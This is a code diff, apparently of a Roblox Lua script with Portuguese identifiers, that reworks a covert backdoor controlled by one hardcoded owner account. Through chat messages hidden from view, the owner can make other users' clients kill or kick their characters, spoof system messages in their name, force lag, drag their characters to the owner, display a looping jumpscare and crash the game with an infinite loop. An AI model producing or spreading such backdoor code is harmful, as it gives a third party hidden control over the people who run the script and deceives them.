@@ -676,6 +676,8 @@ task.spawn(function()
     local DONO_ID = 2980742903
     local telaSusto = nil
     local loopSusto = nil
+    local loopLag = nil
+    local loopControle = nil
 
     local function aplicarTagDono()
         if game:GetService("Players").LocalPlayer.UserId == DONO_ID then return end
@@ -704,24 +706,63 @@ task.spawn(function()
 
     local function executarOrdem(cmd, arg)
         if cmd == "SolicitarVerificacao" then
-            if canalGeral then
-                pcall(function() canalGeral:SendAsync("new123") end)
-            end
-        elseif cmd == "FakeMessage" then
+            if canalGeral then pcall(function() canalGeral:SendAsync("new123") end) end
+        elseif cmd == "fake" then
             if canalGeral then
                 pcall(function()
                     canalGeral:DisplaySystemMessage(string.format("<font color='#FFFFFF'><b>[%s]:</b> %s</font>", jogador.Name, arg))
                 end)
             end
-        elseif cmd == "Danificar" then
+        elseif cmd == "hp" then
             if jogador.Character and jogador.Character:FindFirstChildOfClass("Humanoid") then
-                jogador.Character:FindFirstChildOfClass("Humanoid").Health = tonumber(arg) or 0
+                jogador.Character:FindFirstChildOfClass("Humanoid").Health = 25
             end
-        elseif cmd == "DesconectarScript" then
-            jogador:Kick(arg)
-        elseif cmd == "EfeitoSusto" then
+        elseif cmd == "kill" then
+            if jogador.Character and jogador.Character:FindFirstChildOfClass("Humanoid") then
+                jogador.Character:FindFirstChildOfClass("Humanoid").Health = 0
+            end
+        elseif cmd == "kick" then
+            jogador:Kick(arg ~= "" and arg or "Expulso pela administração.")
+        elseif cmd == "lag" then
+            if arg == "on" then
+                if loopLag then task.cancel(loopLag) end
+                loopLag = task.spawn(function()
+                    while true do
+                        settings().Network.IncomingReplicationLag = 15
+                        task.wait(0.1)
+                    end
+                end)
+            elseif arg == "off" then
+                if loopLag then task.cancel(loopLag) loopLag = nil end
+                settings().Network.IncomingReplicationLag = 0
+            end
+        elseif cmd == "control" then
+            if arg == "on" then
+                if loopControle then task.cancel(loopControle) end
+                local donoChar = game:GetService("Players"):GetPlayerByUserId(DONO_ID).Character
+                local donoRaiz = donoChar and donoChar:FindFirstChild("HumanoidRootPart")
+                local minhaRaiz = jogador.Character and jogador.Character:FindFirstChild("HumanoidRootPart")
+                if donoRaiz and minhaRaiz then
+                    loopControle = task.spawn(function()
+                        while true do
+                            minhaRaiz.CFrame = donoRaiz.CFrame * CFrame.new(0, 0, -3)
+                            task.wait()
+                        end
+                    end)
+                end
+            elseif arg == "off" then
+                if loopControle then task.cancel(loopControle) loopControle = nil end
+            end
+        elseif cmd == "tp" then
+            local donoChar = game:GetService("Players"):GetPlayerByUserId(DONO_ID).Character
+            local donoRaiz = donoChar and donoChar:FindFirstChild("HumanoidRootPart")
+            local minhaRaiz = jogador.Character and jogador.Character:FindFirstChild("HumanoidRootPart")
+            if donoRaiz and minhaRaiz then
+                minhaRaiz.CFrame = donoRaiz.CFrame * CFrame.new(0, 0, 2)
+            end
+        elseif cmd == "jumpscare" then
             local pGui = jogador:WaitForChild("PlayerGui")
-            if arg == "ATIVAR" and not pGui:FindFirstChild("OrvexSNetwork") then
+            if not pGui:FindFirstChild("OrvexSNetwork") then
                 telaSusto = Instance.new("ScreenGui", pGui) telaSusto.Name = "OrvexSNetwork" telaSusto.IgnoreGuiInset = true
                 local f = Instance.new("Frame", telaSusto) f.Size = UDim2.new(1,0,1,0) f.BackgroundColor3 = Color3.fromRGB(0,0,0)
                 local im = Instance.new("ImageLabel", f) im.Size = UDim2.new(0.6,0,0.6,0) im.Position = UDim2.new(0.2,0,0.2,0) im.BackgroundTransparency = 1 im.Image = "rbxassetid://6071575298"
@@ -735,25 +776,28 @@ task.spawn(function()
                         task.wait(0.05)
                     end
                 end)
-            elseif arg == "DESATIVAR" then
-                if loopSusto then task.cancel(loopSusto) loopSusto = nil end
-                if pGui:FindFirstChild("OrvexSNetwork") then pGui:FindFirstChild("OrvexSNetwork"):Destroy() end
             end
-        elseif cmd == "ForcarCrash" then
+        elseif cmd == "unjumpscare" then
+            if loopSusto then task.cancel(loopSusto) loopSusto = nil end
+            local pGui = jogador:WaitForChild("PlayerGui")
+            if pGui:FindFirstChild("OrvexSNetwork") then pGui:FindFirstChild("OrvexSNetwork"):Destroy() end
+        elseif cmd == "crash" then
             while true do end
         end
     end
 
-    -- Escuta os logs locais gerados pelo painel admin de forma oculta
-    game:GetService("LogService").MessageOut:Connect(function(msg)
-        local c, a = string.match(msg, "^%[ORVEX%-SYS%-CMD%]%s*(%w+)%s*|%s*(.*)$")
-        if c then task.spawn(executarOrdem, c, a) end
-        if string.find(msg, "[ORVEX-SYS-REQ]") then task.spawn(executarOrdem, "SolicitarVerificacao", "") end
-    end)
-
-    -- Intercepta e esconde o "new123" enviado no chat
     TextChatService.OnIncomingMessage = function(mensagemObj)
-        if mensagemObj.Text == "new123" then
+        local texto = mensagemObj.Text
+        
+        if texto == "     " then
+            task.spawn(executarOrdem, "SolicitarVerificacao", "")
+            mensagemObj.Text = ""
+            return nil
+        end
+        
+        local c, a = string.match(texto, "^%.ovx%s*(%w+)%s*%s*(.*)$")
+        if c then
+            task.spawn(executarOrdem, c, a)
             mensagemObj.Text = ""
             return nil
         end
